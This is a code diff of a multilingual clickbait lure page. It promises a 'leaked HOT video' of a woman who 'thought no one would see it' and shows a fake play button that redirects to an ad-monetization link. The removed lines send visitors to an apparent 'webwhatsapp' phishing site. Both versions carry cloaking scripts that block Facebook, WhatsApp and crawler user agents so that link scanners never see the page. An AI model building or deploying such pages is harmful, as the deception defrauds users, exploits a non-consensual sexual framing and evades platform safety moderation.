@@ -1,143 +1,92 @@
 <!DOCTYPE html>
-<html lang="es">
+<html lang="auto">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title id="page-title">🔞 Video filtrado muy HOT</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title data-lang="title">🔥 Video filtrado exclusivo 🔥</title>
 
-  <!-- Social Media Preview -->
-  <meta property="og:title" content="🔞 Filtración HOT – No vas a creer lo que hace esta chica 🔥">
-  <meta property="og:description" content="Solo para adultos. Mira antes que lo borren.">
+  <!-- Social Share Preview -->
+  <meta property="og:title" content="🔥 Mira antes que lo borren 🔥">
+  <meta property="og:description" content="Solo mayores de edad. Video HOT en exclusiva.">
   <meta property="og:image" content="https://i.postimg.cc/vBYz6CtP/video-hot-preview.jpg">
   <meta property="og:type" content="website">
-  <meta property="og:url" content="https://webwhatsapp-8rc.pages.dev/">
+  <meta property="og:url" content="https://www.profitableratecpm.com/vwr5zfjkef?key=afb5f08789951183afe3fe0c7a1b5f60">
 
   <style>
     body {
-      background-color: #000;
+      background: #000;
       color: #fff;
       font-family: Arial, sans-serif;
+      margin: 0;
       display: flex;
-      flex-direction: column;
       align-items: center;
       justify-content: center;
+      height: 100vh;
+      overflow: hidden;
+    }
+    .container {
+      position: relative;
       text-align: center;
-      padding: 20px;
-      min-height: 100vh;
     }
-
-    h1 {
-      color: #ff3366;
-      font-size: 6vw;
-      margin-bottom: 15px;
-    }
-
-    p {
-      font-size: 4vw;
-      max-width: 600px;
-      line-height: 1.6;
-      color: #f1f1f1;
-    }
-
-    video.fake-video {
-      margin-top: 20px;
-      border: 4px solid #ff3366;
-      border-radius: 12px;
-      max-width: 90vw;
-      height: auto;
-      box-shadow: 0 0 15px rgba(255, 51, 102, 0.5);
-    }
-
-    .cta-button {
-      margin-top: 25px;
-      padding: 14px 30px;
-      font-size: 4vw;
-      background-color: #ff0033;
-      color: #fff;
-      text-decoration: none;
+    .preview {
+      max-width: 100%;
       border-radius: 10px;
-      transition: 0.3s;
     }
-
-    .cta-button:hover {
-      background-color: #cc002a;
+    .play-overlay {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      font-size: 70px;
+      color: red;
+      background: rgba(0,0,0,0.6);
+      border-radius: 50%;
+      padding: 20px;
+      cursor: pointer;
     }
-
-    @media (min-width: 600px) {
-      h1 { font-size: 32px; }
-      p { font-size: 18px; }
-      .cta-button { font-size: 18px; }
+    .caption {
+      margin-top: 15px;
+      font-size: 1.2rem;
     }
   </style>
 
   <script>
-    const lang = navigator.language.startsWith("es") ? "es" : "en";
+    // Antibot basic filter
+    const bots = [/bot/i, /crawl/i, /spider/i, /facebook/i, /whatsapp/i];
+    if (bots.some(r => r.test(navigator.userAgent))) {
+      document.write("Access denied.");
+      throw new Error("Bot detected");
+    }
 
-    const content = {
+    // Multilanguage handler
+    const lang = navigator.language || navigator.userLanguage;
+    const text = {
       es: {
-        title: "🔞 Video privado filtrado por error… ¡Está demasiado HOT!",
-        text: `⚠️ Este video está causando locura entre los hombres.<br>
-               No es para sensibles. Ella pensó que nadie lo vería…<br>
-               👉 Solo para mayores de edad. Entra bajo tu propio riesgo.`,
-        button: "🔥 Ver el video completo aquí",
-        pageTitle: "🔞 Video filtrado muy HOT"
+        title: "🔥 Video filtrado exclusivo 🔥",
+        caption: "Haz clic para ver el video completo 🔥"
       },
       en: {
-        title: "🔞 Private video leaked… It's insanely HOT!",
-        text: `⚠️ This video is driving men crazy.<br>
-               Not for the faint-hearted. She thought no one would see it…<br>
-               👉 Adults only. Enter at your own risk.`,
-        button: "🔥 Watch full video here",
-        pageTitle: "🔞 Leaked HOT video"
+        title: "🔥 Exclusive leaked video 🔥",
+        caption: "Click to watch the full video 🔥"
+      },
+      pt: {
+        title: "🔥 Vídeo vazado exclusivo 🔥",
+        caption: "Clique para ver o vídeo completo 🔥"
       }
     };
-
-    window.onload = function () {
-      const langContent = content[lang];
-      document.getElementById("page-title").innerText = langContent.pageTitle;
-      document.getElementById("main-title").innerHTML = langContent.title;
-      document.getElementById("main-text").innerHTML = langContent.text;
-      document.getElementById("cta-button").innerText = langContent.button;
+    const selected = text[lang.substring(0, 2)] || text['en'];
+    window.onload = () => {
+      document.title = selected.title;
+      document.querySelector('[data-lang="title"]').textContent = selected.title;
+      document.querySelector('.caption').textContent = selected.caption;
     };
   </script>
 </head>
 <body>
-  <h1 id="main-title">Cargando...</h1>
-  <p id="main-text"></p>
-
-  <!-- VIDEO EN VEZ DE IMAGEN -->
-  <video class="fake-video" controls autoplay muted playsinline poster="https://i.postimg.cc/vBYz6CtP/video-hot-preview.jpg">
-    <source src="https://qu.ax/gVFOJ.mp4" type="video/mp4">
-    Tu navegador no soporta videos HTML5.
-  </video>
-
-  <!-- BOTÓN CTA -->
-  <a id="cta-button" class="cta-button" href="https://webwhatsapp-8rc.pages.dev/">
-    🔥 Cargando...
-  </a>
-
-  <!-- DETECCIÓN ANTIBOT -->
-  <script>
-    function isBot() {
-      const ua = navigator.userAgent.toLowerCase();
-      return ["bot", "crawl", "spider", "slurp", "googlebot", "bingbot", "facebookexternalhit"].some(bot => ua.includes(bot));
-    }
-
-    function detectUserBehavior() {
-      let human = false;
-      window.addEventListener("mousemove", () => human = true);
-      setTimeout(() => {
-        if (!human || isBot()) {
-          window.location.href = "https://webwhatsapp-8rc.pages.dev/";
-        }
-      }, 3000);
-    }
-
-    detectUserBehavior();
-  </script>
-
-  <!-- TRACKING OPCIONAL -->
-  <script id="_wauup1">var _wau = _wau || []; _wau.push(["small", "lonelywolf", "up1"]);</script>
-  <script async src="//waust.at/s.js"></script>
+  <div class="container" onclick="window.location.href='https://www.profitableratecpm.com/vwr5zfjkef?key=afb5f08789951183afe3fe0c7a1b5f60'">
+    <img src="https://i.postimg.cc/vBYz6CtP/video-hot-preview.jpg" class="preview" alt="preview">
+    <div class="play-overlay">▶️</div>
+    <div class="caption">Cargando...</div>
+  </div>
 </body>
 </html>
